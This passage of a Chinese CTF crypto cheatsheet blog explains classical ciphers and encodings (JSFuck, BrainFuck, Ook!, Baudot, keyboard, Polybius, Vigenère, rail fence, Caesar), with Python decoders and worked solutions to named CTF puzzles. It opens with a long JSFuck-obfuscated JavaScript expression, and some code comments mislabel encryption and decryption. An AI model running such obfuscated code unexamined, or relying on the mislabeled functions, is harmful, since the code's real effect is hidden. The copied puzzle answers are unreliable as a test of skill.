class="name">!+</span>[]+!+[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name"><span class="builtin-name">+</span></span>[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]+!+[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">+!+</span>[]]]]]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]+!+[]]]]+([][(<span class="name">!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name"><span class="builtin-name">+</span></span>[]]]]+([][[]]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]+!+[]+!+[]+!+[]]]]+(<span class="name">!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name"><span class="builtin-name">+</span></span>[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]+!+[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">+!+</span>[]]]]]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]+!+[]+!+[]+!+[]+!+[]]]]+([][[]]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">+!+</span>[]]]]+(<span class="name">!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]+!+[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name"><span class="builtin-name">+</span></span>[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">+!+</span>[]]]]+([][[]]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name"><span class="builtin-name">+</span></span>[]]]]+([][(<span class="name">!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name"><span class="builtin-name">+</span></span>[]]]]+([][[]]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]+!+[]+!+[]+!+[]]]]+(<span class="name">!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name"><span class="builtin-name">+</span></span>[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]+!+[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">+!+</span>[]]]]]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]+!+[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name"><span class="builtin-name">+</span></span>[]]]]+([][(<span class="name">!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name"><span class="builtin-name">+</span></span>[]]]]+([][[]]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]+!+[]+!+[]+!+[]]]]+(<span class="name">!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name"><span class="builtin-name">+</span></span>[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]+!+[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">+!+</span>[]]]]]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]+!+[]+!+[]+!+[]+!+[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">+!+</span>[]]]]]((<span class="name">!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">+!+</span>[]]]]+(<span class="name">!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]+!+[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">+!+</span>[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name"><span class="builtin-name">+</span></span>[]]]]+([][(<span class="name">!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name"><span class="builtin-name">+</span></span>[]]]]+([][[]]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]+!+[]+!+[]+!+[]]]]+(<span class="name">!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name"><span class="builtin-name">+</span></span>[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]+!+[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">+!+</span>[]]]]]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">+!+</span>[]]]+[[<span class="name">!+</span>[]+!+[]+!+[]+!+[]+!+[]]]]+[<span class="name">+!+</span>[]]+([][(<span class="name">!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name"><span class="builtin-name">+</span></span>[]]]]+([][[]]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]+!+[]+!+[]+!+[]]]]+(<span class="name">!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name"><span class="builtin-name">+</span></span>[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]+!+[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">+!+</span>[]]]]]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">+!+</span>[]]]+[[<span class="name">!+</span>[]+!+[]+![]+!+[]+!+[]+!+[]]]])()</span><br></pre></td></tr></table></figure><h2 id="·加-解密方式：网页解析"><a href="#·加-解密方式：网页解析" class="headerlink" title="·加/解密方式：网页解析"></a>·加/解密方式：<a href="https://www.bugku.com/tools/jsfuck/#">网页解析</a></h2><p><img src="https://img-blog.csdnimg.cn/20210403093233812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0Mzk4NTE5,size_16,color_FFFFFF,t_70" alt="jsfuck"></p><h1 id="17-BrainFuck密码"><a href="#17-BrainFuck密码" class="headerlink" title="17.BrainFuck密码"></a>17.BrainFuck密码</h1><h2 id="·简介-1"><a href="#·简介-1" class="headerlink" title="·简介"></a>·简介</h2><blockquote><p>这种语言，是一种按照“Turing complete（图灵完备）”思想设计的语言，它的主要设计思路是：用最小的概念实现一种“简单”的语言，BrainFuck 语言只有 <strong>&gt;&lt;+-.,[]</strong> 八种符号，所有的操作都由这八种符号的组合来完成。</p></blockquote><h2 id="·加-解密方式：网页解析-1"><a href="#·加-解密方式：网页解析-1" class="headerlink" title="·加/解密方式：网页解析"></a>·加/解密方式：<a href="https://www.splitbrain.org/services/ook">网页解析</a></h2><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcetpOSi6P6mNz0*bGxc6RM5wklqepltgu2p0c9bTIQIo6XEJX0Ig0Xnp7ohlDev5hhhHRxDFfu1gMBi.y9qq64c!/b&bo=uAPIAQAAAAADF0A!&rf=viewer_4" alt="bf"></p><h1 id="20-Ook-密码"><a href="#20-Ook-密码" class="headerlink" title="20.Ook!密码"></a>20.Ook!密码</h1><h2 id="·简介-2"><a href="#·简介-2" class="headerlink" title="·简介"></a>·简介</h2><blockquote><p>所有明文转换成<strong>Ook.?!</strong></p></blockquote><h2 id="·加-解密方式：网页解析-2"><a href="#·加-解密方式：网页解析-2" class="headerlink" title="·加/解密方式：网页解析"></a>·加/解密方式：<a href="https://www.splitbrain.org/services/ook">网页解析</a></h2><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcetpOSi6P6mNz0*bGxc6RM54RuzleTmqwU19oIwsWJOf6c1q2qcGXMBtcpT34UetCpLJS6EMQ*JrhZL1R8dX48I!/b&bo=3APQAQAAAAADFzw!&rf=viewer_4" alt="Ook!"></p><h1 id="21-博多密码"><a href="#21-博多密码" class="headerlink" title="21.博多密码"></a>21.<a href="https://www.tuilixy.net/thread-101379-1-1.html">博多密码</a></h1><h2 id="·简介-3"><a href="#·简介-3" class="headerlink" title="·简介"></a>·简介</h2><blockquote><p>·博多电码是法国工程师博多于1874年推出的一种电报码。它在20世纪中期取代了莫尔斯电码被广泛应用。<br>·博多码，是一种5位代表一个字节的编码。在那个年代，5位的系统已经非常复杂，位数更多不切合实际，但稍加分析便可知道，5位是不可能代表26个英文字母+数字+各种符号的，而博多码并不是一个像电脑所使用的，一个8位特定的二进制数字专门地表示一个字符的编码系统，博多使用了同一组编码分别表示字母集和数字标点符号集，通过两个字符实现字符集之间的切换。因此，当报文中同时包含了英文字母和数字和符号的时候，必须加入切换字符来表示在不同的集之间的切换。博多式电报机是这样的一个样子：发报收报端各一台看上去是钢琴一般的只有5个按键的机器，按键从左到右按字母顺序排列，通过电路两两相连，两边按下键盘时，对方的纸带上会打印出相对应按键的黑点，当需要打符号的时候，只需要按照编码表上表示切换到符号集（Figures）所代表编码按下对应的按键，此后输出的都会被收报员人工判读为符号或者数字，当需要恢复到输入字母时，按下编码表上表示字母集（Letters）的按键，此后的内容都会被判读为字母。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210403093600842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0Mzk4NTE5,size_16,color_FFFFFF,t_70" alt="博多密码"></p><h1 id="22-键盘密码·QWE替换"><a href="#22-键盘密码·QWE替换" class="headerlink" title="22.键盘密码·QWE替换"></a>22.键盘密码·QWE替换</h1><h2 id="·简介-4"><a href="#·简介-4" class="headerlink" title="·简介"></a>·简介</h2><blockquote><p>QWE格式密码就是QWERTYUIOP ASDFGHJKL ZXCVBNM 依次表示字母ABCDEFGHIJKLMNOQRSTUVWXYZ。</p></blockquote><h2 id="·加-解密方式：对表-5"><a href="#·加-解密方式：对表-5" class="headerlink" title="·加/解密方式：对表"></a>·加/解密方式：对表</h2><p><img src="https://img-blog.csdnimg.cn/20210403093331330.png" alt="qwe"></p><h1 id="23-键盘密码·QWE包围"><a href="#23-键盘密码·QWE包围" class="headerlink" title="23.键盘密码·QWE包围"></a>23.键盘密码·QWE包围</h1><h2 id="·简介-5"><a href="#·简介-5" class="headerlink" title="·简介"></a>·简介</h2><blockquote><p>解密方式：每组密文所围住的按键上的字符<br>例: yujnbg, 观察键盘发现这六个字母围住了h，故明文为h。</p></blockquote><h2 id="·加-解密方式：观察键盘"><a href="#·加-解密方式：观察键盘" class="headerlink" title="·加/解密方式：观察键盘"></a>·加/解密方式：观察键盘</h2><p><img src="https://img-blog.csdnimg.cn/20210403093902713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0Mzk4NTE5,size_16,color_FFFFFF,t_70" alt="键盘"></p><h1 id="24-键盘密码·九一"><a href="#24-键盘密码·九一" class="headerlink" title="24.键盘密码·九一"></a>24.键盘密码·九一</h1><blockquote><p>·名字自己胡诌的。此类键盘密码的特征是有两种形式，<strong>重复的数字</strong>、<strong>重复的英文</strong>。<br>·一是指<strong>键盘第一行</strong>的意思，九是指<strong>九宫格</strong>。<br>·[NCTF2019]Keyboard<br>ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee<br>·发现密文全在键盘字母第一行，若再上一行，则会得到字母与数字的映射关系，例如：q对应1，w对映2。<br>·此时会发现数字全都是小于10的，对应九宫格拼音，又重复次数在四次以内，则重复次数是一宫中的行坐标。<br>例：ooo -&gt; 999 -&gt; y<br>·[MRCTF2020]keyboard<br>得到的flag用<br>MRCTF{xxxxxx}形式包上<br>都为小写字母<br>6<br>666<br>22<br>444<br>555<br>33<br>7<br>44<br>666<br>66<br>3<br>·相比于重复字母，则是<strong>少了映射</strong>的一步，直接在九宫格定位。<br>·例：6 -&gt; M</p></blockquote><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcYP4C8ib86UJY13JEY8qM0GTMEktDbhFe9qQiAeuPSWW3VuYa6B1ChV8dNySjim7vFAQ8H2WFzK4L5V*DkXVmfQ!/b&bo=PAPXAQAAAAABF9k!&rf=viewer_4" alt="九宫格"></p><h2 id="·加-解密方式：Python3代码实现"><a href="#·加-解密方式：Python3代码实现" class="headerlink" title="·加/解密方式：Python3代码实现"></a>·加/解密方式：Python3代码实现</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cipher = input(<span class="string">&#x27;请输入键盘密码（数字或英文）：&#x27;</span>)</span><br><span class="line">base = <span class="string">&quot; qwertyuiop&quot;</span></span><br><span class="line">a = [<span class="string">&quot; &quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;abc&quot;</span>, <span class="string">&quot;def&quot;</span>, <span class="string">&quot;ghi&quot;</span>, <span class="string">&quot;jkl&quot;</span>, <span class="string">&quot;mno&quot;</span>, <span class="string">&quot;pqrs&quot;</span>, <span class="string">&quot;tuv&quot;</span>, <span class="string">&quot;wxyz&quot;</span>]</span><br><span class="line">dict_zm = &#123;<span class="number">1</span>: <span class="string">&#x27;q&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;w&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;e&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;r&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;t&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;y&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;u&#x27;</span>, <span class="number">8</span>: <span class="string">&#x27;i&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;o&#x27;</span>, <span class="number">0</span>: <span class="string">&#x27;p&#x27;</span>&#125;</span><br><span class="line">b = []</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.join(cipher.<span class="keyword">split</span>(<span class="string">&#x27; &#x27;</span>)).isdigit():  <span class="comment"># 是数字时</span></span><br><span class="line">    cipher = cipher.<span class="keyword">split</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">each</span> in cipher:</span><br><span class="line">        b.append(dict_zm[<span class="keyword">int</span>(<span class="keyword">each</span>[<span class="number">0</span>])]*len(<span class="keyword">each</span>))</span><br><span class="line">    cipher = <span class="string">&#x27; &#x27;</span>.join(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> part in cipher.<span class="keyword">split</span>(<span class="string">&quot; &quot;</span>):</span><br><span class="line">    s = base.index(part[<span class="number">0</span>])</span><br><span class="line">    count = len(part)</span><br><span class="line">    <span class="keyword">print</span>(a[s][count-<span class="number">1</span>], end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcX0BNK3pjcJhOngJrWUCYRlKMVYJ4khaZaCPPyPP3H8yCrjM9qwmpHtmZI1*zqpOgm70GuribgqCUV3s7atcXjY!/b&bo=ogNiAAAAAAADF*E!&rf=viewer_4" alt="key"></p><h1 id="25-棋盘密码"><a href="#25-棋盘密码" class="headerlink" title="25.棋盘密码"></a>25.棋盘密码</h1><h2 id="·简介-6"><a href="#·简介-6" class="headerlink" title="·简介"></a>·简介</h2><blockquote><p>Polybius 密码又称为棋盘密码，一般是将给定的明文加密为两两组合的数字</p></blockquote><h2 id="·加-解秘方式：对表"><a href="#·加-解秘方式：对表" class="headerlink" title="·加/解秘方式：对表"></a>·加/解秘方式：对表</h2><h3 id="·基础版"><a href="#·基础版" class="headerlink" title="·基础版"></a>·基础版</h3><p><img src="https://img-blog.csdnimg.cn/20210403094002612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0Mzk4NTE5,size_16,color_FFFFFF,t_70" alt="普通"></p><blockquote><p>·明文：HELLO 密文：23 15 31 31 34</p></blockquote><h3 id="·变异版"><a href="#·变异版" class="headerlink" title="·变异版"></a>·变异版</h3><p><img src="https://pic4.zhimg.com/80/v2-aeb54d2ffb99ffc88579afbb7153e2cd_1440w.jpg?source=1940ef5c" alt="变异"></p><blockquote><p>·使用这种密码表的加密也叫作 ADFGX 密码（密文中只有 A D F G X）<br>·明文：HELLO 密文：DD XF AG AG DF</p></blockquote><h1 id="26-维吉尼亚密码"><a href="#26-维吉尼亚密码" class="headerlink" title="26.维吉尼亚密码"></a>26.维吉尼亚密码</h1><h2 id="·简介-7"><a href="#·简介-7" class="headerlink" title="·简介"></a>·简介</h2><blockquote><p>维吉尼亚密码是在凯撒密码基础上产生的一种加密方法，它将凯撒密码的全部25种位移排序为一张表，与原字母序列共同组成26行及26列的字母表。另外，维吉尼亚密码必须有一个密钥，这个密钥由字母组成，最少一个，最多可与明文字母数量相等。</p></blockquote><h2 id="·加-解密方式：网页解析-3"><a href="#·加-解密方式：网页解析-3" class="headerlink" title="·加/解密方式：网页解析"></a>·加/解密方式：<a href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php">网页解析</a></h2><blockquote><p>维吉尼亚密码加密方法示例如下：</p><p>明文：I’ve got it.<br>密钥：ok</p><p>密文：W’fs qcd wd.</p><p>首先，密钥长度需要与明文长度相同，如果少于明文长度，则重复拼接直到相同。本例中，明文长度为8个字母（非字母均被忽略），密钥会被程序补全为“okokokok”。</p></blockquote><p>现在根据如下维吉尼亚密码表格进行加密：<br><img src="https://www.qqxiuzi.cn/bianma/weijiniyamima.png" alt="wjny"></p><blockquote><p>明文第一个字母是“I”，密钥第一个字母是“o”，在表格中找到“I”列与“o”行相交点，字母“W”就是密文第一个字母；同理，“v”列与“k”行交点字母是“F”；“e”列与“o”行交点字母是“S”……</p><p>维吉尼亚密码只对字母进行加密，不区分大小写，若文本中出现非字母字符会原样保留。<br>如果输入多行文本，每行是单独加密的。</p></blockquote><h1 id="27-栅栏密码"><a href="#27-栅栏密码" class="headerlink" title="27.栅栏密码"></a>27.栅栏密码</h1><h2 id="·简介-8"><a href="#·简介-8" class="headerlink" title="·简介"></a>·简介</h2><blockquote><p>·分为传统型与变异W型<br>·接下来，介绍传统型栅栏密码<br>·所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话）</p></blockquote><h3 id="传统栅栏"><a href="#传统栅栏" class="headerlink" title="传统栅栏"></a>传统栅栏</h3><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcenxWGz*UwB9sIxbzgzRTs.tHITnpw3hIGnPq1v.RSnIXjgu8jT.Xkn2e0GYXm9JlZRgWAEAh8VAhb3Zmv46rYs!/b&bo=5AKIAQAAAAADF10!&rf=viewer_4" alt="ct"><br><strong>·Python3实现</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enFence</span>(<span class="params">string, space</span>):</span> <span class="comment"># 解密</span></span><br><span class="line">   s = <span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, space):</span><br><span class="line">       <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i, <span class="built_in">len</span>(string), space):</span><br><span class="line">           <span class="comment"># 不能越界</span></span><br><span class="line">           <span class="keyword">if</span> j &lt; <span class="built_in">len</span>(string):</span><br><span class="line">               s += string[j]</span><br><span class="line">   <span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deFence</span>(<span class="params">string, space</span>):</span> <span class="comment"># 加密</span></span><br><span class="line">   s = <span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(string) % space == <span class="number">0</span>:</span><br><span class="line">       key = <span class="built_in">len</span>(string) // space</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       key = <span class="built_in">len</span>(string) // space + <span class="number">1</span></span><br><span class="line">   <span class="comment"># 小于间隔继续</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, key):</span><br><span class="line">       <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i, <span class="built_in">len</span>(string), key):</span><br><span class="line">           <span class="comment"># 不能越界</span></span><br><span class="line">           <span class="keyword">if</span> j &lt; <span class="built_in">len</span>(string):</span><br><span class="line">               s += string[j]</span><br><span class="line">   <span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factoring</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;对大数进行因数分解&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(n, <span class="built_in">int</span>):</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;You must give me an integer&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment">#开始分解，把所有因数都添加到result列表中</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">while</span> n!=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> n%p == <span class="number">0</span>:</span><br><span class="line">                n = n/p</span><br><span class="line">                result.append(p)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result = <span class="built_in">map</span>(<span class="built_in">str</span>, result)</span><br><span class="line">            result = <span class="string">&#x27;*&#x27;</span>.join(result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">    <span class="comment">#考虑参数本身就是素数的情况</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">maxData = <span class="number">10000</span></span><br><span class="line"><span class="comment">#小于maxData的所有素数</span></span><br><span class="line">primes = [ p <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, maxData) <span class="keyword">if</span> <span class="number">0</span> <span class="keyword">not</span> <span class="keyword">in</span></span><br><span class="line">        [ p% d <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(sqrt(p))+<span class="number">1</span>)] ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = <span class="built_in">input</span>(<span class="string">&quot;请输入栅栏密码：&quot;</span>)</span><br><span class="line">len_m = <span class="built_in">len</span>(m)</span><br><span class="line"><span class="built_in">print</span>(len_m, <span class="string">&#x27;=&#x27;</span>, factoring(len_m))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    o = <span class="built_in">input</span>(<span class="string">&quot;支持输入不只一个数字，但要用空格分开，例：X Y Z \n 每组字母数字：&quot;</span>)</span><br><span class="line">    o = o.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> o:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;每组字母数：&#x27;</span>, each)</span><br><span class="line">        enFence(m, <span class="built_in">int</span>(each))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;错误!&#x27;</span>, <span class="string">&#x27;输入密文位数为&#x27;</span>, len_m)</span><br></pre></td></tr></table></figure><h3 id="W型栅栏"><a href="#W型栅栏" class="headerlink" title="W型栅栏"></a>W型栅栏</h3><p><strong>·简介</strong></p><blockquote><p>W型栅栏密码加密的方法中，明文由上至下顺序写上，当到达最低部时，再回头向上，一直重复直至整篇明文写完为止。</p></blockquote><p><strong>·加解密方式：<a href="http://www.atoolbox.net/Tool.php?Id=777">网页解析</a></strong></p><blockquote><p>此例子中，其包含了三栏及一段明文：’WEAREDISCOVEREDFLEEATONCE’。如下：</p><p>W . . . E . . . C . . . R . . . L . . . T . . . E<br>. E . R . D . S . O . E . E . F . E . A . O . C .<br>. . A . . . I . . . V . . . D . . . E . . . N . .</p><p>按行读取后的密文：</p><p>WECRLTEERDSOEEFEAOCAIVDEN<br>W型的加密密钥就不只能是字符串长度的因子，小于其长度的任何一个数都可能是其key值，所以第一步也是确定密钥。</p></blockquote><h1 id="28-凯撒密码"><a href="#28-凯撒密码" class="headerlink" title="28.凯撒密码"></a>28.凯撒密码</h1><h2 id="·简介-9"><a href="#·简介-9" class="headerlink" title="·简介"></a>·简介</h2><blockquote><p>凯撒密码最早由古罗马军事统帅盖乌斯·尤利乌斯·凯撒在军队中用来传递加密信息，故称凯撒密码。此为一种位移加密手段，只对26个（大小写）字母进行位移加密，规则相当简单，容易被破解。下面是明文字母表移回3位的对比：<br>明文字母表 X Y Z A B C D E F G H I J K L M N O P Q R S T U V W<br>密文字母表 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z<br>然后A变成D，B变成E，Z变成C。<br>字母最多可移动25位（按字母表）。通常为向后移动，如果您想向前移动1位，则相当于向后移动25位，位移选择为25位。</p></blockquote><h2 id="·加-解密方式：Python3实现"><a href="#·加-解密方式：Python3实现" class="headerlink" title="·加/解密方式：Python3实现"></a>·加/解密方式：Python3实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 